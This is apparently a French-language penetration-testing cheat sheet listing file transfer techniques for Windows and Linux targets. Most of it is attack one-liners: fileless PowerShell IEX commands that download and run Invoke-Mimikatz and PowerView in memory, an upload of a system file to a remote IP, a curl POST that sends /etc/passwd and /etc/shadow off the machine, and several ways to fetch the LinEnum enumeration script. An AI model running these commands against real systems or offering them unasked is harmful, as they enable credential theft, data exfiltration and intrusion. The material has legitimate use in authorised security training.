# Méthodes de transfert de fichiers Windows
## Méthode PowerShell DownloadFile

### Téléchargement de fichier

```PowerShell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

### PowerShell DownloadString – Méthode sans fichier

Comme nous l'avons vu précédemment, les attaques sans fichier utilisent certaines fonctions du système d'exploitation pour télécharger la charge utile et l'exécuter directement. PowerShell peut également être utilisé pour réaliser des attaques sans fichier. Au lieu de télécharger un script PowerShell sur le disque, nous pouvons l'exécuter directement en mémoire à l'aide de l' applet de commande Invoke-Expression ou de l'alias IEX.

```Powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

À partir de PowerShell 3.0, l' applet de commande Invoke-WebRequest est également disponible, mais son téléchargement est sensiblement plus lent. Vous pouvez utiliser les alias iwr, curl et wget au lieu du Invoke-WebRequest .

```Powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

### Erreurs courantes avec PowerShell
Il peut arriver que la configuration du premier lancement d'Internet Explorer n'ait pas été effectuée, ce qui empêche le téléchargement.

```Powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### Copier un fichier depuis le serveur SMB

```Powershell
copy \\192.168.220.133\share\nc.exe
```

## Téléchargements FTP
### Script PowerShell pour télécharger un fichier sur le serveur de téléchargement Python

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

# Méthodes de transfert de fichiers Linux

Linux est un système d'exploitation polyvalent, doté de nombreux outils permettant de transférer des fichiers. Comprendre les méthodes de transfert de fichiers sous Linux peut aider les attaquants et les défenseurs à améliorer leurs compétences en matière d'attaques réseau et de prévention des attaques sophistiquées.


## Téléchargements Web avec Wget et cURL

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Linux - Téléchargement de fichiers avec SCP

```bash
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

### Linux - Télécharger plusieurs fichiers

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Transfert de fichiers avec du code
Il est courant de trouver différents langages de programmation installés sur les machines ciblées. Des langages tels que Python, PHP, Perl et Ruby sont couramment disponibles sur les distributions Linux, mais peuvent également être installés sur Windows, bien que ce soit beaucoup plus rare.

#### Python

```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### PHP

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

### Transferts de fichiers protégés




https://gist.github.com/HarmJ0y/bb48307ffa663256e239